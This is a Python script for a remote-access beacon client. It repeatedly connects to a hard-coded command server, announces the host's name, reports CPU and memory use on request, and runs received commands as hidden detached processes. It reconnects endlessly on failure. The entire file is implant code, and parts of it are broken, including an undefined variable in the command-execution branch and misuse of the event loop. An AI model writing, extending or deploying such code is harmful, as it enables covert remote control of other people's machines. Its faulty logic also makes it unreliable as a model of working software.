import asyncio
from time import sleep
from socket import gethostname
from subprocess import run, PIPE
import psutil

h_ip = "127.0.0.1"
h_port = 8888

class glbls:
    live = True
    cmd = "_null_"


async def tcp_echo_client(message, loop):
    while glbls.live == True:
        try:
            #BEGIN LOOP
            reader, writer = await asyncio.open_connection(h_ip, h_port, loop=loop)

            #BEACON
            beacon = str(gethostname() + ": _beacon_").encode()
            writer.write(beacon)
            print("READING....")
            glbls.cmd = await reader.read(100)
            glbls.cmd = glbls.cmd.decode()
            #print(f"REC: {dec}")
            if "stat" in glbls.cmd:
                cpu = str(round(float(psutil.cpu_percent()), 2)) + "%"
                ram = str(psutil.virtual_memory()) + "B"
                glbls.cmd = f"CPU: {cpu} / RAM: {ram}"

            if "run" in glbls.cmd:
                glbls.cmd = dec.replace("run ", "")
                cmd = glbls.cmd.split()
                #print(f"EXEC: {str(cmd)}")
                run(
                    [cmd],
                    stdout = PIPE,
                    stderr = PIPE,
                    universal_newlines=True,
                    shell=False,
                    creationflags=0x00000008
                    )
            #print(f'SENDING: {glbls.cmd} ')
            writer.write(glbls.cmd.encode())    
            await asyncio.sleep(3)
            loop.close()
        
        

        #writer.close()
        except Exception as f:
            glbls.live = False
            
            #print(f)
            sleep(3)
            main()

def main():
    sleep(1)
    try:
        message = str(gethostname()) + ":_ack_"
        sleep(3)
        loop = asyncio.get_event_loop()
        loop.run_until_complete(tcp_echo_client(message, loop))
        main()
    except Exception as D:
        #print(D)
        glbls.live = False
        main()

main()        
